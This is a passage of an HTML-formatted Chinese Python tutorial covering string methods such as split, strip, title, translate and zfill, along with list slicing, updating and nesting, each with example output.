punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#      this is string example....wow!!!</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"*****this is string example....wow!!!*****\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># *****this is string example....wow!!!</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 以空格为分隔符</span>\n<span class=\"token comment\"># ['this', 'is', 'string', 'example....wow!!!']</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'i'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 以 i 为分隔符</span>\n<span class=\"token comment\"># ['th', 's is string example....wow!!!']</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 以 w 为分隔符</span>\n<span class=\"token comment\"># ['this is string example....', 'o', '!!!']</span>\n\ntxt <span class=\"token operator\">=</span> <span class=\"token string\">\"Google#Runoob#Taobao#Facebook\"</span>\n<span class=\"token comment\"># 第二个参数为 1，返回两个参数列表</span>\nx <span class=\"token operator\">=</span> txt<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"#\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['Google', 'Runoob#Taobao#Facebook']</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ab c\\n\\nde fg\\rkl\\r\\n'</span><span class=\"token punctuation\">.</span>splitlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span><span class=\"token string\">'ab c'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'de fg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'kl'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ab c\\n\\nde fg\\rkl\\r\\n'</span><span class=\"token punctuation\">.</span>splitlines<span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['ab c\\n', '\\n', 'de fg\\r', 'kl\\r\\n']</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'this'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 字符串是否以 this 开头</span>\n<span class=\"token comment\"># True</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 从第九个字符开始的字符串是否以 string 开头</span>\n<span class=\"token comment\"># True</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'this'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 从第2个字符开始到第四个字符结束的字符串是否以 this 开头</span>\n<span class=\"token comment\"># False</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"123abcrunoob321\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">'12'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 字符序列为 12</span>\n<span class=\"token comment\"># 3abcrunoob3</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>swapcase<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># THIS IS STRING EXAMPLE....WOW!!!</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"This Is String Example....WOW!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>swapcase<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># tHIS iS sTRING eXAMPLE....wow!!!</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example from runoob....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># This Is String Example From Runoob....Wow!!!</span>\ntxt <span class=\"token operator\">=</span> <span class=\"token string\">\"hello b2b2b2 and 3g3g3g\"</span>\nx <span class=\"token operator\">=</span> txt<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 非字母后的第一个字母将转换为大写字母</span>\n<span class=\"token comment\"># Hello B2B2B2 And 3G3G3G</span>\n\nintab <span class=\"token operator\">=</span> <span class=\"token string\">\"aeiou\"</span>\nouttab <span class=\"token operator\">=</span> <span class=\"token string\">\"12345\"</span>\ntrantab <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>maketrans<span class=\"token punctuation\">(</span>intab<span class=\"token punctuation\">,</span> outtab<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 制作翻译表</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>translate<span class=\"token punctuation\">(</span>trantab<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># th3s 3s str3ng 2x1mpl2....w4w!!!</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example from runoob....wow!!!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str.upper() : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># str.upper() :  THIS IS STRING EXAMPLE FROM RUNOOB....WOW!!!</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example from runoob....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str.zfill : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># str.zfill :  this is string example from runoob....wow!!!</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str.zfill : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># str.zfill :  000000this is string example from runoob....wow!!!</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob2016\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isdecimal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"23443434\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isdecimal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\n<span class=\"token triple-quoted-string string\">'''\nstr.capitalize() :  This is string example from runoob....wow!!!\nstr.center(40, '*') :  ****************[runoob]****************\nstr.count('o') :  3\nstr.count('run', 0, 10) :  1\n菜鸟教程\nUTF-8 编码： b'\\xe8\\x8f\\x9c\\xe9\\xb8\\x9f\\xe6\\x95\\x99\\xe7\\xa8\\x8b'\nGBK 编码： b'\\xb2\\xcb\\xc4\\xf1\\xbd\\xcc\\xb3\\xcc'\nUTF-8 解码： 菜鸟教程\nGBK 解码： 菜鸟教程\nTrue\nTrue\nFalse\nFalse\n原始字符串: runoob\t12345\tabc\n替换 \\t 符号: runoob  12345   abc\n使用 2 个空格替换 \\t 符号: runoob  12345 abc\n使用 3 个空格: runoob   12345 abc\n使用 4 个空格: runoob  12345   abc\n使用 5 个空格: runoob    12345     abc\n使用 6 个空格: runoob      12345 abc\n7\n7\n-1\n7\n7\nTrue\nFalse\nTrue\nTrue\nFalse\nTrue\nFalse\nFalse\nTrue\nFalse\nTrue\nTrue\nFalse\nTrue\nFalse\nTrue\nFalse\nr-u-n-o-o-b\nrunoob\n6\n5\nRunoob example....wow!!!**************************\nrunoob example....wow!!!\nthis is string example....wow!!!     \nthis is string example....wow!!!8888888\nth3s 3s str3ng 2x1mpl2....w4w!!!\n最大字符: u\n最小字符: b\n菜鸟教程旧地址： www.w3cschool.cc\n菜鸟教程新地址： www.runoob.com\nthwas was string example....wow!!!\n5\n5\n-1\n2\n2\n-1\n5\n******************this is string example....wow!!!\n     this is string example....wow!!!\n*****this is string example....wow!!!\n['this', 'is', 'string', 'example....wow!!!']\n['th', 's is string example....wow!!!']\n['this is string example....', 'o', '!!!']\n['Google', 'Runoob#Taobao#Facebook']\n['ab c', '', 'de fg', 'kl']\n['ab c\\n', '\\n', 'de fg\\r', 'kl\\r\\n']\nTrue\nTrue\nFalse\n3abcrunoob3\nTHIS IS STRING EXAMPLE....WOW!!!\ntHIS iS sTRING eXAMPLE....wow!!!\nThis Is String Example From Runoob....Wow!!!\nHello B2B2B2 And 3G3G3G\nth3s 3s str3ng 2x1mpl2....w4w!!!\nstr.upper() :  THIS IS STRING EXAMPLE FROM RUNOOB....WOW!!!\nstr.zfill :  this is string example from runoob....wow!!!\nstr.zfill :  000000this is string example from runoob....wow!!!\nFalse\nTrue\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h2><ol>\n<li>索引截取方式与元组相同</li>\n<li>截取后成为一个新列表</li>\n<li>元素在打方括号中，以逗号分隔</li>\n<li>列表的元素可改变</li>\n<li>元素可以是元组</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">list</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999</span><span class=\"token punctuation\">]</span>\nlist2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出完整列表</span>\n<span class=\"token comment\"># ['test', 1, 1.2, 999]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出列表第一个元素</span>\n<span class=\"token comment\"># test</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 从第二个开始输出到第三个元素</span>\n<span class=\"token comment\"># [1, 1.2]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出从第三个元素开始的所有元素</span>\n<span class=\"token comment\"># [1.2, 999]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list2 <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出两次列表</span>\n<span class=\"token comment\"># [1, 'test', 1, 'test']</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span> <span class=\"token operator\">+</span> list2<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 连接列表</span>\n<span class=\"token comment\"># ['test', 1, 1.2, 999, 1, 'test']</span>\nlist3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list3<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 2, 3, 4, 5]</span>\nlist3<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>  <span class=\"token comment\"># 修改第一元素</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list3<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['test', 2, 3, 4, 5]</span>\nlist3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 修改第三个到第四元素</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list3<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['test', 2, 22, 33, 5]</span>\nlist4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list4<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 2, 3, 4, 5]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list4<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\"># 第一个-1表示从最后一个开始</span>\n<span class=\"token comment\"># 中间为空表示移动到列表末,最后一个-1为步长,-表示逆向</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list4<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [4, 3, 2]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list4<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [5]</span>\n<span class=\"token triple-quoted-string string\">'''\n['test', 1, 1.2, 999]\ntest\n[1, 1.2]\n[1.2, 999]\n[1, 'test', 1, 'test']\n['test', 1, 1.2, 999, 1, 'test']\n[1, 2, 3, 4, 5]\n['test', 2, 3, 4, 5]\n['test', 2, 22, 33, 5]\n[1, 2, 3, 4, 5]\n[5, 4, 3, 2, 1]\n[4, 3, 2]\n[5]\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"更新和删除元素\"><a href=\"#更新和删除元素\" class=\"headerlink\" title=\"更新和删除元素\"></a>更新和删除元素</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">list5 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list5<span class=\"token punctuation\">)</span>\nlist5<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">'restart'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list5<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 在末尾添加元素</span>\n<span class=\"token keyword\">del</span> list5<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 删除第三个元素</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list5<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n[1, 3, 5, 'test']\n[1, 3, 5, 'test', 'restart']\n[1, 3, 'test', 'restart']\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"列表脚本操作符\"><a href=\"#列表脚本操作符\" class=\"headerlink\" title=\"列表脚本操作符\"></a>列表脚本操作符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">list6 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list6<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>list6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 列表长度</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 组合</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 重复</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token keyword\">in</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 存在与否</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 迭代</span>\n    \n<span class=\"token triple-quoted-string string\">'''\n[1, 2, 3, 'test']\n4\n[1, 2, 3, 4, 5, 6]\n['test', 'test', 'test', 'test']\nTrue\n1 2 3 \n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"镶嵌列表\"><a href=\"#镶嵌列表\" class=\"headerlink\" title=\"镶嵌列表\"></a>镶嵌列表</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 镶嵌列表</span>\na <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'c'</span><span class=\"token punctuation\">]</span>\nn <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n[['a', 'b', 'c'], [1, 2, 3]]\n['a', 'b', 'c']\nb\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"函数-1\"><a 